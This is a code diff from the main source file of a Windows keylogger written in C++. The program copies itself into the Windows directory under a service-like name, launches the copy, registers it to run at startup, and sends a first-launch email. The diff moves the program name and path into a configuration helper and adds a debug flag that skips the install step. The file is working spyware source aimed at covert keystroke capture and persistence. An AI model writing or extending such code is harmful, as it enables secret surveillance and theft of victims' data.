@@ -1,17 +1,17 @@
 #include "stdafx.h"
-//#define DBG
+#define DBG
 
 #include "modules/Keylogger.h"
 #include "modules/SocketServer.h"
 #include "helpers/StringHelper.h"
 #include "helpers/ComputerInfoHelper.h"
 #include "services/EmailService.h"
+#include "helpers/Configuration.h"
 
 extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
 #define SECONDS_IN_DAY 86400
 #define CHECK_TIME_INTERVAL 1800
-#define PROGRAM_NAME L"service.exe"
 
 shared_ptr<Keylogger> logger;
 shared_ptr<SocketServer> socketServer;
@@ -33,14 +33,15 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	freopen("CONOUT$", "w", stdout);
 	_setmode(_fileno(stdout), _O_U8TEXT);
 	freopen("CONOUT$", "w", stderr);
-#endif // _DEBUG
-
+#endif // _DBG
+#ifndef DBG
 	auto isFirstLaunch = makeFirstLaunch();
 	if (isFirstLaunch) {
 		return 0;
 	}
 	// Only in first launch
 	sendFirstEmail();
+#endif // !DBG
 
 	MSG msg;
 	WNDCLASS wndClass;
@@ -140,7 +141,7 @@ bool makeFirstLaunch() {
 	std::wstring winDir = std::wstring(buff);
 	if (StringHelper::toLower(path).find(StringHelper::toLower(winDir)) != 0) {
 		// Copy self to windir
-		std::wstring newPath = winDir + L"\\" + PROGRAM_NAME;
+		std::wstring newPath = Configuration::GetProgramPath();
 		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
 		if (result) {
 			std::wcout << L"copied";
@@ -158,7 +159,7 @@ bool makeFirstLaunch() {
 
 		CreateProcess(newPath.c_str(), NULL, NULL, NULL,
 			NULL, NULL, NULL, NULL, &si, &pi);
-		addToStartup(PROGRAM_NAME, newPath);
+		addToStartup(Configuration::GetProgramName(), newPath);
 		return true;
 	} else {
 		return false;
